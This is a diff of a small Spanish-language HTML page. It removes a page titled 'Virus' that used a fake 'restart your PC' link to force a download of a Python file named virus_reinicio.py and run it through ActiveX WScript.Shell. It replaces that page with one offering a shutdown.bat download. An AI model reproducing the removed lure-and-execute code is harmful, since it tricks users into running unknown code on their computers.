@@ -1,26 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Virus</title>
+  <title>Shutdown Script</title>
 </head>
 <body>
-    <h1>¡Haz clic en este enlace para reiniciar tu PC!</h1>
-    <a href="#" onclick="activarVirus()">Reiniciar PC</a>
-
-    <script>
-        function activarVirus() {
-            // Descarga el archivo .py
-            var link = document.createElement('a');
-            link.href = 'virus_reinicio.py';
-            link.download = 'virus_reinicio.py';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-
-            // Ejecuta el archivo .py
-            var shell = new ActiveXObject("WScript.Shell");
-            shell.Run("python virus_reinicio.py", 1, true);
-        }
-    </script>
+  <h1>¡Apagando la computadora!</h1>
+  <a href="shutdown.bat" download>Descargar script de apagado</a>
 </body>
 </html>
+
